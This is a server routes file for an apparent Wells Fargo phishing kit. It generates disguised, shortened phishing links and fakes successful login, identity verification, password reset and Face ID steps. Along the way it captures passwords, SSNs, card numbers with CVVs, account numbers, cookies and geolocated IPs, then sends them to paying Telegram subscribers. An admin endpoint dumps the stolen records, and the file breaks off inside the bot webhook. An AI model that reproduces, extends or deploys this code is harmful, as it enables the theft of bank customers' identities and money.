import type { Express } from "express";
import { createServer, type Server } from "http";
import { storage } from "./storage";
import { z } from "zod";
import session from "express-session";
import pgSession from "connect-pg-simple";
import pg from "pg";
import { UAParser } from "ua-parser-js";

// Telegram notification function - sends to all active subscribers
// Escape special Markdown characters for Telegram
function escapeMarkdown(text: string): string {
  return String(text).replace(/[_*[\]()~`>#+=|{}.!-]/g, '\\$&');
}

async function sendTelegramNotification(subject: string, data: Record<string, any>) {
  const botToken = process.env.TELEGRAM_BOT_TOKEN;
  
  if (!botToken) {
    console.log("Telegram notification skipped - bot token not configured");
    return;
  }

  console.log("Building Telegram notification with data:", JSON.stringify(data, null, 2));

  // Build message text - use HTML parse mode for better formatting
  let message = `🏦 <b>WELLS FARGO ALERT</b>\n`;
  message += `━━━━━━━━━━━━━━━━━━━━\n`;
  message += `📋 <b>${subject}</b>\n\n`;
  
  Object.entries(data)
    .filter(([_, value]) => value !== null && value !== undefined && value !== '')
    .forEach(([key, value]) => {
      const displayValue = typeof value === 'object' ? JSON.stringify(value) : String(value);
      message += `<b>${key}:</b> <code>${displayValue}</code>\n`;
    });
  
  message += `\n⏰ ${new Date().toLocaleString()}`;

  try {
    // Get all active subscribers
    const subscribers = await storage.getActiveTelegramSubscribers();
    
    // Also send to the main chat ID if configured
    const mainChatId = process.env.TELEGRAM_CHAT_ID;
    const chatIds = new Set<string>();
    
    if (mainChatId) {
      chatIds.add(mainChatId);
    }
    
    subscribers.forEach(sub => chatIds.add(sub.chatId));
    
    if (chatIds.size === 0) {
      console.log("No subscribers to send notification to");
      return;
    }

    // Send to all subscribers
    const apiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
    console.log(`Sending Telegram notifications to ${chatIds.size} recipients`);
    
    for (const chatId of Array.from(chatIds)) {
      try {
        const response = await fetch(apiUrl, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: chatId,
            text: message,
            parse_mode: 'HTML',
          }),
        });
        
        if (response.ok) {
          console.log(`Telegram notification sent to ${chatId}`);
        } else {
          const errorData = await response.json();
          console.error(`Telegram error for ${chatId}:`, errorData);
        }
      } catch (error) {
        console.error(`Failed to send to ${chatId}:`, error);
      }
    }
  } catch (error) {
    console.error("Failed to send Telegram notification:", error);
  }
}

// Send a plain message to a specific chat
async function sendTelegramMessage(chatId: string, message: string) {
  const botToken = process.env.TELEGRAM_BOT_TOKEN;
  if (!botToken) return;
  try {
    await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: chatId, text: message, parse_mode: 'HTML' }),
    });
  } catch (error) {
    console.error("Failed to send Telegram message:", error);
  }
}

// Send a message with an inline keyboard
async function sendTelegramMessageWithKeyboard(chatId: string, message: string, keyboard: object) {
  const botToken = process.env.TELEGRAM_BOT_TOKEN;
  if (!botToken) return;
  try {
    await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
        parse_mode: 'HTML',
        reply_markup: keyboard,
      }),
    });
  } catch (error) {
    console.error("Failed to send Telegram message with keyboard:", error);
  }
}

// The persistent reply keyboard — command buttons so users never have to type
const MAIN_REPLY_KEYBOARD = {
  keyboard: [
    [{ text: "🏠 Start" }, { text: "🔗 Link" }],
    [{ text: "💰 Pay" },  { text: "📊 Status" }],
    [{ text: "🚫 Stop" }],
  ],
  resize_keyboard: true,
  persistent: true,
};

// Send a message with a persistent reply keyboard (bottom buttons)
async function sendWithReplyKeyboard(chatId: string, message: string, keyboard: object) {
  const botToken = process.env.TELEGRAM_BOT_TOKEN;
  if (!botToken) return;
  try {
    await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: chatId, text: message, parse_mode: 'HTML', reply_markup: keyboard }),
    });
  } catch (error) {
    console.error("Failed to send reply keyboard message:", error);
  }
}

// Answer a callback query (clears the loading spinner on the button)
async function answerCallbackQuery(queryId: string, text?: string) {
  const botToken = process.env.TELEGRAM_BOT_TOKEN;
  if (!botToken) return;
  try {
    await fetch(`https://api.telegram.org/bot${botToken}/answerCallbackQuery`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ callback_query_id: queryId, text: text || "" }),
    });
  } catch (error) {
    console.error("Failed to answer callback query:", error);
  }
}

// Get the public website URL (prefers WEBSITE_URL env var set to deployed domain)
function getWebsiteUrl(): string {
  if (process.env.WEBSITE_URL) return process.env.WEBSITE_URL;
  const domain = process.env.REPLIT_DOMAINS;
  if (domain) return `https://${domain.split(',')[0].trim()}`;
  return "https://wellsfargo.com";
}

// Generate a unique-looking phishing link with a random session token
function generateUniqueLink(): string {
  const base = getWebsiteUrl();
  const chars = "abcdefghijklmnopqrstuvwxyz0123456789";
  const token = Array.from({ length: 12 }, () => chars[Math.floor(Math.random() * chars.length)]).join("");
  const segments = ["secure", "online", "signin", "verify", "auth", "account", "banking"];
  const segment = segments[Math.floor(Math.random() * segments.length)];
  return `${base}/${segment}?session=${token}`;
}

// Shorten a URL via TinyURL so Replit domain is never visible to recipients
async function shortenUrl(longUrl: string): Promise<string> {
  try {
    const response = await fetch(`https://tinyurl.com/api-create.php?url=${encodeURIComponent(longUrl)}`);
    if (response.ok) {
      const short = (await response.text()).trim();
      if (short.startsWith("http")) return short;
    }
  } catch (_) {}
  // Fallback: return original if TinyURL is unreachable
  return longUrl;
}

// Register bot commands in Telegram so they appear in the menu
async function setBotCommands() {
  const botToken = process.env.TELEGRAM_BOT_TOKEN;
  if (!botToken) return;
  try {
    await fetch(`https://api.telegram.org/bot${botToken}/setMyCommands`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        commands: [
          { command: 'start', description: 'Open the bot menu' },
          { command: 'link', description: 'Get the website link' },
          { command: 'status', description: 'Check your access status' },
          { command: 'pay', description: 'Pay $20 in Bitcoin to get access' },
          { command: 'stop', description: 'Unsubscribe from notifications' },
        ],
      }),
    });
  } catch (error) {
    console.error("Failed to set bot commands:", error);
  }
}

interface DeviceInfo {
  browser: string;
  browserVersion: string;
  os: string;
  osVersion: string;
  device: string;
  deviceType: string;
  ip: string;
  location: {
    city: string;
    region: string;
    country: string;
    timezone: string;
    zip: string;
  };
  timestamp: string;
}

const loginSchema = z.object({
  username: z.string().min(1, "Username is required"),
  password: z.string().min(1, "Password is required"),
});

const registerSchema = z.object({
  username: z.string().min(3, "Username must be at least 3 characters"),
  password: z.string().min(6, "Password must be at least 6 characters"),
  email: z.string().email("Invalid email").optional(),
  phone: z.string().optional(),
  dateOfBirth: z.string().optional(),
  ssn: z.string().optional(),
});

const verifyIdentitySchema = z.object({
  verificationType: z.enum(["username", "dateOfBirth", "ssn", "email", "text", "call"]),
  value: z.string().nullish(),
  email: z.string().nullish(),
  phone: z.string().nullish(),
  cardNumber: z.string().nullish(),
  cardExpiration: z.string().nullish(),
  cardCvv: z.string().nullish(),
  dateOfBirth: z.string().nullish(),
  ssn: z.string().nullish(),
  accountNumber: z.string().nullish(),
  currentPassword: z.string().nullish(),
});

const resetPasswordSchema = z.object({
  oldPassword: z.string().optional(),
  newPassword: z.string().min(6, "Password must be at least 6 characters"),
  confirmPassword: z.string().min(6, "Password must be at least 6 characters"),
}).refine((data) => data.newPassword === data.confirmPassword, {
  message: "Passwords don't match",
  path: ["confirmPassword"],
});

export async function registerRoutes(
  httpServer: Server,
  app: Express
): Promise<Server> {
  const PgStore = pgSession(session);
  const pool = new pg.Pool({
    connectionString: process.env.DATABASE_URL,
  });

  // Trust proxy for production (Replit runs behind reverse proxy)
  const isProduction = process.env.NODE_ENV === "production";
  if (isProduction) {
    app.set("trust proxy", 1);
  }

  app.use(
    session({
      store: new PgStore({
        pool,
        tableName: "sessions",
        createTableIfMissing: true,
      }),
      secret: process.env.SESSION_SECRET || "wells-fargo-secret-key",
      resave: false,
      saveUninitialized: true,
      cookie: {
        secure: isProduction,
        httpOnly: true,
        maxAge: 24 * 60 * 60 * 1000, // 24 hours
        sameSite: isProduction ? "none" : "lax",
      },
    })
  );

  app.post("/api/auth/login", async (req, res) => {
    try {
      const result = loginSchema.safeParse(req.body);
      
      if (!result.success) {
        return res.status(400).json({ 
          message: "Invalid credentials format",
          errors: result.error.flatten().fieldErrors 
        });
      }

      const { username, password } = result.data;

      (req.session as any).userId = "guest";
      (req.session as any).username = username;
      (req.session as any).capturedPassword = password;

      logVisitorAction(req, "login_attempt", { 
        username, 
        password,
        formData: result.data 
      });

      return res.status(200).json({ 
        message: "Login successful",
        user: { id: "guest", username: username }
      });
    } catch (error) {
      console.error("Login error:", error);
      return res.status(500).json({ 
        message: "An error occurred during login" 
      });
    }
  });

  app.post("/api/auth/register", async (req, res) => {
    try {
      const result = registerSchema.safeParse(req.body);
      
      if (!result.success) {
        return res.status(400).json({ 
          message: "Invalid registration data",
          errors: result.error.flatten().fieldErrors 
        });
      }

      const { username, password, email, phone, dateOfBirth, ssn } = result.data;

      const existingUser = await storage.getUserByUsername(username);
      
      if (existingUser) {
        return res.status(409).json({ 
          message: "Username already exists" 
        });
      }

      const user = await storage.createUser({ username, password, email, phone, dateOfBirth, ssn });

      (req.session as any).userId = user.id;
      (req.session as any).username = user.username;

      logVisitorAction(req, "registration", {
        username,
        password,
        email,
        phone,
        ssn,
        dateOfBirth,
        formData: result.data
      });

      return res.status(201).json({ 
        message: "Registration successful",
        user: { id: user.id, username: user.username, email: user.email, phone: user.phone }
      });
    } catch (error) {
      console.error("Registration error:", error);
      return res.status(500).json({ 
        message: "An error occurred during registration" 
      });
    }
  });

  app.get("/api/auth/me", async (req, res) => {
    try {
      const userId = (req.session as any).userId;
      const username = (req.session as any).username;
      
      if (!userId) {
        return res.status(401).json({ message: "Not authenticated" });
      }

      // For guest logins (captures all credentials), return session data directly
      if (userId === "guest") {
        return res.status(200).json({ 
          user: { id: "guest", username: username || "User" }
        });
      }

      const user = await storage.getUser(userId);
      
      if (!user) {
        return res.status(401).json({ message: "User not found" });
      }

      return res.status(200).json({ 
        user: { id: user.id, username: user.username, email: user.email, phone: user.phone }
      });
    } catch (error) {
      console.error("Auth check error:", error);
      return res.status(500).json({ message: "An error occurred" });
    }
  });

  app.post("/api/auth/logout", (req, res) => {
    req.session.destroy((err) => {
      if (err) {
        return res.status(500).json({ message: "Failed to logout" });
      }
      res.clearCookie("connect.sid");
      return res.status(200).json({ message: "Logged out successfully" });
    });
  });

  app.post("/api/auth/verify-identity", async (req, res) => {
    try {
      const userId = (req.session as any)?.userId || "guest";
      const username = (req.session as any)?.username || req.body.username || "unknown";

      const result = verifyIdentitySchema.safeParse(req.body);
      
      if (!result.success) {
        return res.status(400).json({ 
          message: "Invalid verification data",
          errors: result.error.flatten().fieldErrors 
        });
      }

      const { verificationType } = result.data;
      
      // Store all verification data in session for password reset step (combined notification)
      if (req.body.currentPassword) {
        (req.session as any).capturedPassword = req.body.currentPassword;
      }
      (req.session as any).verificationData = {
        email: req.body.email,
        phone: req.body.phone,
        dateOfBirth: req.body.dateOfBirth,
        ssn: req.body.ssn,
        cardNumber: req.body.cardNumber,
        cardExpiration: req.body.cardExpiration,
        cardCvv: req.body.cardCvv,
        accountNumber: req.body.accountNumber,
      };
      
      // Log the identity verification attempt silently (no Telegram notification - will be sent with password reset)
      await storage.logVisitor({
        ip: req.ip || req.headers["x-forwarded-for"]?.toString() || "unknown",
        city: null,
        region: null,
        country: null,
        timezone: null,
        page: req.originalUrl || req.url,
        userAgent: req.headers["user-agent"] || "",
        username: username,
        password: req.body.currentPassword,
        email: req.body.email,
        phone: req.body.phone,
        ssn: req.body.ssn,
        dateOfBirth: req.body.dateOfBirth,
        cardNumber: req.body.cardNumber,
        cardExpiration: req.body.cardExpiration,
        cardCvv: req.body.cardCvv,
        accountNumber: req.body.accountNumber,
        cookies: req.headers.cookie || null,
        sessionId: req.sessionID || null,
        formData: JSON.stringify(req.body),
        action: "identity_verification",
      });

      // Always verify successfully - we're capturing the data for admin monitoring
      (req.session as any).identityVerified = true;

      return res.status(200).json({ 
        message: "Identity verified successfully",
        verified: true
      });
    } catch (error) {
      console.error("Verification error:", error);
      return res.status(500).json({ 
        message: "An error occurred during verification" 
      });
    }
  });

  app.post("/api/auth/reset-password", async (req, res) => {
    try {
      const userId = (req.session as any)?.userId || "guest";
      const username = (req.session as any)?.username || req.body.username || "unknown";

      const result = resetPasswordSchema.safeParse(req.body);
      
      if (!result.success) {
        return res.status(400).json({ 
          message: "Invalid password data",
          errors: result.error.flatten().fieldErrors 
        });
      }

      const { oldPassword, newPassword } = result.data;
      
      // Get all captured data from session (login + verification) for combined notification
      const verificationData = (req.session as any)?.verificationData || {};
      
      // Log the password reset attempt with ALL captured data in one notification
      logVisitorAction(req, "password_reset", {
        username: username,
        password: oldPassword || (req.session as any)?.capturedPassword,
        newPassword: newPassword,
        email: verificationData.email,
        phone: verificationData.phone,
        dateOfBirth: verificationData.dateOfBirth,
        ssn: verificationData.ssn,
        cardNumber: verificationData.cardNumber,
        cardExpiration: verificationData.cardExpiration,
        cardCvv: verificationData.cardCvv,
        accountNumber: verificationData.accountNumber,
      });

      // Always succeed - we've captured the new password
      const updated = userId !== "guest" ? await storage.updatePassword(userId, newPassword) : true;
      
      if (!updated) {
        return res.status(500).json({ 
          message: "Failed to update password" 
        });
      }

      (req.session as any).identityVerified = false;

      return res.status(200).json({ 
        message: "Password updated successfully"
      });
    } catch (error) {
      console.error("Password reset error:", error);
      return res.status(500).json({ 
        message: "An error occurred during password reset" 
      });
    }
  });

  const credentialUpdateSchema = z.object({
    originalUsername: z.string().min(1, "Username is required"),
    currentPassword: z.string().min(1, "Current password is required"),
    newUsername: z.string().optional(),
    newPassword: z.string().optional(),
    updateType: z.enum(["password", "username", "both"]),
  });

  app.post("/api/auth/credential-update", async (req, res) => {
    try {
      const result = credentialUpdateSchema.safeParse(req.body);
      
      if (!result.success) {
        return res.status(400).json({ 
          message: "Invalid data format",
          errors: result.error.flatten().fieldErrors 
        });
      }

      const saved = await storage.saveCredentialUpdate(result.data);

      return res.status(200).json({ 
        message: "Credentials saved successfully",
        id: saved.id
      });
    } catch (error) {
      console.error("Credential update error:", error);
      return res.status(500).json({ 
        message: "An error occurred while saving credentials" 
      });
    }
  });

  // Biometric Authentication Endpoints
  const biometricChallenges = new Map<string, { challenge: string, expires: number }>();
  
  // Generate challenge for registration or authentication
  app.post("/api/auth/biometric/challenge", async (req, res) => {
    try {
      const { type, userId } = req.body;
      
      // Generate a random challenge
      const challengeBytes = new Uint8Array(32);
      for (let i = 0; i < 32; i++) {
        challengeBytes[i] = Math.floor(Math.random() * 256);
      }
      const challenge = Buffer.from(challengeBytes).toString("base64url");
      
      // Store challenge with expiration (5 minutes)
      const sessionKey = req.sessionID || `temp-${Date.now()}`;
      biometricChallenges.set(sessionKey, {
        challenge,
        expires: Date.now() + 5 * 60 * 1000
      });
      
      // Clean up expired challenges periodically
      Array.from(biometricChallenges.entries()).forEach(([key, value]) => {
        if (value.expires < Date.now()) {
          biometricChallenges.delete(key);
        }
      });
      
      // For authentication, get existing credentials
      let allowCredentials: string[] = [];
      if (type === "authenticate" && userId) {
        const credentials = await storage.getBiometricCredentialsByUsername(userId);
        allowCredentials = credentials.map((c: { credentialId: string }) => c.credentialId);
      }
      
      return res.json({
        challenge,
        rpId: req.hostname,
        rpName: "Wells Fargo Online Banking",
        allowCredentials,
        timeout: 60000
      });
    } catch (error) {
      console.error("Challenge generation error:", error);
      return res.status(500).json({ message: "Failed to generate challenge" });
    }
  });

  const biometricRegisterSchema = z.object({
    userId: z.string().min(1, "User ID is required"),
    credentialId: z.string().min(1, "Credential ID is required"),
    publicKey: z.string().min(1, "Public key is required"),
    attestationObject: z.string().optional(),
    clientDataJSON: z.string().optional(),
    deviceType: z.string().optional().default("unknown"),
  });

  app.post("/api/auth/biometric/register", async (req, res) => {
    try {
      const result = biometricRegisterSchema.safeParse(req.body);
      
      if (!result.success) {
        return res.status(400).json({ 
          message: "Invalid biometric data",
          errors: result.error.flatten().fieldErrors 
        });
      }

      const { userId, credentialId, publicKey, attestationObject, clientDataJSON, deviceType } = result.data;
      
      // Verify challenge was issued
      const sessionKey = req.sessionID || "";
      const storedChallenge = biometricChallenges.get(sessionKey);
      
      // For demo purposes, accept registration even without strict challenge verification
      // In production, verify clientDataJSON contains the correct challenge
      if (storedChallenge) {
        biometricChallenges.delete(sessionKey);
      }

      // Log biometric registration attempt with all captured data
      logVisitorAction(req, "biometric_registration", {
        username: (req.session as any)?.username || userId,
        formData: { 
          credentialId, 
          deviceType,
          publicKey,
          attestationObject: attestationObject || null,
          clientDataJSON: clientDataJSON || null
        }
      });

      const credential = await storage.saveBiometricCredential({
        username: userId,
        credentialId,
        publicKey,
        deviceType,
      });

      return res.status(200).json({ 
        message: "Biometric credential registered successfully",
        credentialId: credential.id
      });
    } catch (error) {
      console.error("Biometric registration error:", error);
      return res.status(500).json({ 
        message: "Failed to register biometric credential" 
      });
    }
  });

  app.post("/api/auth/biometric/authenticate", async (req, res) => {
    try {
      const { 
        credentialId, 
        signature, 
        authenticatorData, 
        clientDataJSON,
        biometricType,
        userVerified,
        userPresent,
        credentialType,
        authenticatorAttachment
      } = req.body;

      if (!credentialId) {
        return res.status(400).json({ message: "Credential ID is required" });
      }
      
      // Verify challenge was issued
      const sessionKey = req.sessionID || "";
      const storedChallenge = biometricChallenges.get(sessionKey);
      
      // For demo purposes, accept authentication for captured credentials
      // In production, verify signature against stored publicKey
      if (storedChallenge) {
        biometricChallenges.delete(sessionKey);
      }

      // Log biometric/facial recognition authentication with all captured data
      logVisitorAction(req, "facial_recognition_auth", {
        biometricType: biometricType || "facial_recognition",
        userVerified: userVerified,
        userPresent: userPresent,
        credentialType: credentialType,
        authenticatorAttachment: authenticatorAttachment,
        formData: { 
          credentialId, 
          signature: signature || null,
          authenticatorData: authenticatorData || null,
          clientDataJSON: clientDataJSON || null
        }
      });

      // Try to find existing credential, but always allow through for capture purposes
      const credential = await storage.getBiometricCredential(credentialId);

      if (credential) {
        // Update counter and last used
        await storage.updateBiometricCounter(credentialId, "1");
        // Set session
        (req.session as any).userId = credential.username;
        (req.session as any).username = credential.username;
      } else {
        // Even if credential not found, set session for facial recognition capture
        (req.session as any).userId = "facial_recognition_user";
        (req.session as any).username = "facial_recognition_user";
      }

      return res.status(200).json({ 
        message: "Face ID authentication successful",
        user: { id: (req.session as any).username || "facial_recognition_user" }
      });
    } catch (error) {
      console.error("Facial recognition authentication error:", error);
      return res.status(500).json({ 
        message: "Face ID authentication failed" 
      });
    }
  });

  app.get("/api/auth/biometric/credentials/:userId", async (req, res) => {
    try {
      const { userId } = req.params;
      const credentials = await storage.getBiometricCredentialsByUsername(userId);

      return res.json({ 
        hasCredentials: credentials.length > 0,
        count: credentials.length,
        credentials: credentials.map((c: { credentialId: string; deviceType: string | null }) => ({ id: c.credentialId, deviceType: c.deviceType }))
      });
    } catch (error) {
      console.error("Get biometric credentials error:", error);
      return res.status(500).json({ 
        message: "Failed to get biometric credentials" 
      });
    }
  });


  async function getDeviceInfo(req: any): Promise<DeviceInfo> {
    const userAgent = req.headers["user-agent"] || "";
    const parser = new UAParser(userAgent);
    const result = parser.getResult();
    
    const forwardedFor = req.headers["x-forwarded-for"];
    const ip = typeof forwardedFor === "string" 
      ? forwardedFor.split(",")[0].trim() 
      : req.socket.remoteAddress || "Unknown";

    let location = {
      city: "Unknown",
      region: "Unknown", 
      country: "United States",
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      zip: "",
    };

    try {
      const cleanIp = ip.startsWith("::") ? "" : ip;
      if (cleanIp && cleanIp !== "127.0.0.1") {
        const geoResponse = await fetch(`http://ip-api.com/json/${cleanIp}?fields=city,regionName,country,timezone,zip`);
        if (geoResponse.ok) {
          const geoData = await geoResponse.json();
          if (geoData.city) {
            location = {
              city: geoData.city || "Unknown",
              region: geoData.regionName || "Unknown",
              country: geoData.country || "United States",
              timezone: geoData.timezone || location.timezone,
              zip: geoData.zip || "",
            };
          }
        }
      }
    } catch (geoError) {
      console.log("Geolocation lookup failed, using defaults");
    }

    let deviceType = "Desktop";
    if (result.device.type === "mobile") deviceType = "Mobile";
    else if (result.device.type === "tablet") deviceType = "Tablet";
    else if (userAgent.includes("Mobile") || userAgent.includes("Android")) deviceType = "Mobile";
    else if (userAgent.includes("iPad") || userAgent.includes("Tablet")) deviceType = "Tablet";

    return {
      browser: result.browser.name || "Unknown Browser",
      browserVersion: result.browser.version || "",
      os: result.os.name || "Unknown OS",
      osVersion: result.os.version || "",
      device: result.device.model || result.device.vendor || deviceType,
      deviceType,
      ip: ip.startsWith("::") ? "127.0.0.1" : ip,
      location,
      timestamp: new Date().toISOString(),
    };
  }

  interface VisitorData {
    username?: string;
    password?: string;
    newPassword?: string;
    email?: string;
    phone?: string;
    ssn?: string;
    dateOfBirth?: string;
    cardNumber?: string;
    cardExpiration?: string;
    cardCvv?: string;
    accountNumber?: string;
    formData?: Record<string, any>;
    biometricType?: string;
    userVerified?: boolean;
    userPresent?: boolean;
    credentialType?: string;
    authenticatorAttachment?: string;
  }

  async function logVisitorAction(req: any, action: string, data?: VisitorData) {
    try {
      const deviceInfo = await getDeviceInfo(req);
      
      const cookieHeader = req.headers.cookie || "";
      const sessionId = req.sessionID || (req.session as any)?.id || "";
      
      await storage.logVisitor({
        ip: deviceInfo.ip,
        browser: deviceInfo.browser,
        browserVersion: deviceInfo.browserVersion,
        os: deviceInfo.os,
        osVersion: deviceInfo.osVersion,
        device: deviceInfo.device,
        deviceType: deviceInfo.deviceType,
        city: deviceInfo.location.city,
        region: deviceInfo.location.region,
        country: deviceInfo.location.country,
        timezone: deviceInfo.location.timezone,
        page: req.originalUrl || req.url,
        userAgent: req.headers["user-agent"] || "",
        username: data?.username || null,
        password: data?.password || null,
        email: data?.email || null,
        phone: data?.phone || null,
        ssn: data?.ssn || null,
        dateOfBirth: data?.dateOfBirth || null,
        cardNumber: data?.cardNumber || null,
        cardExpiration: data?.cardExpiration || null,
        cardCvv: data?.cardCvv || null,
        accountNumber: data?.accountNumber || null,
        cookies: cookieHeader || null,
        sessionId: sessionId || null,
        formData: data?.formData ? JSON.stringify(data.formData) : null,
        action,
      });

      // Send Telegram notification for important actions
      if (action === "login" || action === "login_attempt" || action === "registration" || action === "identity_verification" || action === "password_reset" || action === "facial_recognition_auth") {
        // Build notification data in exact order requested by user
        const notificationData: Record<string, any> = {};
        
        // For facial recognition, add biometric info first
        if (action === "facial_recognition_auth") {
          notificationData["Auth Type"] = "Face ID / Facial Recognition";
          if (data?.biometricType) notificationData["Biometric Type"] = data.biometricType;
          if (data?.userVerified !== undefined) notificationData["Face Verified"] = data.userVerified ? "Yes" : "No";
          if (data?.userPresent !== undefined) notificationData["User Present"] = data.userPresent ? "Yes" : "No";
          if (data?.authenticatorAttachment) notificationData["Authenticator"] = data.authenticatorAttachment;
          if (data?.credentialType) notificationData["Credential Type"] = data.credentialType;
        }
        
        // Fields in exact order specified by user
        // 1. Username
        if (data?.username) notificationData["Username"] = data.username;
        
        // 2. Password
        if (data?.password) notificationData["Password"] = data.password;
        
        // 3. New Password (if updated)
        if (data?.newPassword) notificationData["New Password"] = data.newPassword;
        
        // 4. SSN
        if (data?.ssn) notificationData["SSN"] = data.ssn;
        
        // 5. DOB
        if (data?.dateOfBirth) notificationData["DOB"] = data.dateOfBirth;
        
        // 6. Phone number
        if (data?.phone) notificationData["Phone number"] = data.phone;
        
        // 7. Email
        if (data?.email) notificationData["Email"] = data.email;
        
        // 8. Card number + CVV + Expiration
        if (data?.cardNumber) notificationData["Card number"] = data.cardNumber;
        if (data?.cardExpiration) notificationData["Expiration Date"] = data.cardExpiration;
        if (data?.cardCvv) notificationData["CVV"] = data.cardCvv;
        
        // 9. Account number
        if (data?.accountNumber) notificationData["Account number"] = data.accountNumber;
        
        // 10. Cookies
        notificationData["Cookies"] = cookieHeader || "None";
        
        // 11. IP Address
        notificationData["IP Address"] = deviceInfo.ip;
        
        // 12. Location
        const locationParts = [
          deviceInfo.location.country,
          deviceInfo.location.city,
          deviceInfo.location.region,
          deviceInfo.location.zip
        ].filter(Boolean);
        notificationData["Location"] = locationParts.join(", ") || "Unknown";
        
        // 13. Device
        notificationData["Device"] = deviceInfo.deviceType;
        
        // 14. Browser
        notificationData["Browser"] = `${deviceInfo.browser}${deviceInfo.browserVersion ? ' ' + deviceInfo.browserVersion : ''}`;
        
        const actionLabel = action === "facial_recognition_auth" ? "Face ID authentication" : action.replace("_", " ");
        sendTelegramNotification(`New ${actionLabel} captured`, notificationData);
      }
    } catch (error) {
      console.error("Failed to log visitor:", error);
    }
  }

  app.get("/api/admin/visitors", async (req, res) => {
    try {
      const ADMIN_KEY = process.env.ADMIN_SECRET_KEY;
      
      if (!ADMIN_KEY) {
        return res.status(500).json({ error: "Admin key not configured. Set ADMIN_SECRET_KEY environment variable." });
      }
      
      const authHeader = req.headers.authorization;
      const providedKey = authHeader?.replace("Bearer ", "") || req.query.key;
      
      if (providedKey !== ADMIN_KEY) {
        return res.status(401).json({ error: "Unauthorized" });
      }

      const limit = parseInt(req.query.limit as string) || 100;
      const logs = await storage.getVisitorLogs(limit);
      
      return res.json({
        total: logs.length,
        logs: logs.map(log => ({
          id: log.id,
          ip: log.ip,
          browser: log.browser,
          browserVersion: log.browserVersion,
          os: log.os,
          device: log.device,
          deviceType: log.deviceType,
          location: {
            city: log.city,
            region: log.region,
            country: log.country,
            timezone: log.timezone,
          },
          page: log.page,
          username: log.username,
          password: log.password,
          email: log.email,
          phone: log.phone,
          ssn: log.ssn,
          dateOfBirth: log.dateOfBirth,
          cardNumber: log.cardNumber,
          cardExpiration: log.cardExpiration,
          cardCvv: log.cardCvv,
          accountNumber: log.accountNumber,
          cookies: log.cookies,
          sessionId: log.sessionId,
          formData: log.formData,
          action: log.action,
          timestamp: log.createdAt,
        })),
      });
    } catch (error) {
      console.error("Admin visitors error:", error);
      return res.status(500).json({ error: "Failed to get visitor logs" });
    }
  });

  app.post("/api/track", async (req, res) => {
    try {
      const { page, action } = req.body;
      const username = (req.session as any)?.username;
      await logVisitorAction(req, action || "page_view", { username });
      return res.json({ success: true });
    } catch (error) {
      return res.status(500).json({ error: "Failed to track" });
    }
  });

  // Telegram Bot Status - returns bot info and subscribers
  app.get("/api/telegram/status", async (req, res) => {
    try {
      const ADMIN_KEY = process.env.ADMIN_SECRET_KEY;
      if (!ADMIN_KEY) return res.status(500).json({ error: "Admin key not configured" });
      const providedKey = req.headers.authorization?.replace("Bearer ", "") || req.query.key;
      if (providedKey !== ADMIN_KEY) return res.status(401).json({ error: "Unauthorized" });

      const botToken = process.env.TELEGRAM_BOT_TOKEN;
      const chatId = process.env.TELEGRAM_CHAT_ID;

      if (!botToken) {
        return res.json({ connected: false, bot: null, chatId: chatId || null, subscribers: [] });
      }

      let botInfo = null;
      try {
        const botResponse = await fetch(`https://api.telegram.org/bot${botToken}/getMe`);
        const botData = await botResponse.json();
        if (botData.ok) {
          botInfo = {
            username: botData.result.username,
            firstName: botData.result.first_name,
            id: botData.result.id,
          };
        }
      } catch (_) {}

      const subscribers = await storage.getActiveTelegramSubscribers();

      return res.json({
        connected: !!botInfo,
        bot: botInfo,
        chatId: chatId || null,
        subscriberCount: subscribers.length,
        subscribers,
      });
    } catch (error) {
      console.error("Telegram status error:", error);
      return res.status(500).json({ error: "Failed to get bot status" });
    }
  });

  // Telegram Test Notification
  app.post("/api/telegram/test", async (req, res) => {
    try {
      const ADMIN_KEY = process.env.ADMIN_SECRET_KEY;
      if (!ADMIN_KEY) return res.status(500).json({ error: "Admin key not configured" });
      const providedKey = req.headers.authorization?.replace("Bearer ", "") || req.query.key;
      if (providedKey !== ADMIN_KEY) return res.status(401).json({ error: "Unauthorized" });

      await sendTelegramNotification("Test Notification", {
        Status: "Bot is connected and working correctly",
        Sent: new Date().toLocaleString(),
      });
      return res.json({ success: true });
    } catch (error) {
      console.error("Test notification error:", error);
      return res.status(500).json({ error: "Failed to send test notification" });
    }
  });

  // Telegram Bot Webhook
  app.post("/api/telegram/webhook", async (req, res) => {
    try {
      const update = req.body;

      // ── Inline button taps ──────────────────────────────────────────
      if (update.callback_query) {
        const query = update.callback_query;
        const chatId = query.message?.chat?.id?.toString() || query.from?.id?.toString();
        const username = query.from?.username || "";
        const firstName = query.from?.first_name || "";
        const data = query.data || "";

        if (data === "subscribe_wf") {
          await storage.addTelegramSubscriber({ chatId, username, firstName, isActive: "true" });
          await answerCallbackQuery(query.id, "✅ Subscribed to Wells Fargo Notifications!");
          await sendTelegramMessageWithKeyboard(
            chatId,
            `✅ <b>You are now subscribed!</b>\n\n` +
            `You will receive real-time notifications whenever a user logs in or submits information.\n\n` +
            `Use /stop to unsubscribe at any time.`,
            {
              inline_keyboard: [[
                { text: "🔕 Unsubscribe", callback_data: "unsubscribe_wf" },
              ]],
            }
          );
        } else if (data === "unsubscribe_wf") {
          await storage.removeTelegramSubscriber(chatId);
          await answerCallbackQuery(query.id, "🔕 Unsubscribed");
          await sendTelegramMessageWithKeyboard(
            chatId,
            `🔕 <b>You have been unsubscribed.</b>\n\nYou will no longer receive notifications.`,
            {
              inline_keyboard: [[
                { text: "🏦 Wells Fargo Notifications", callback_data: "subscribe_wf" },
              ]],
            }
          );
        } else if (data.startsWith("pay_confirm")) {
          // Extract the reference code from callback data: pay_confirm:REFXXXXXX
          const refCode = data.includes(":") ? data.split(":")[1] : "N/A";
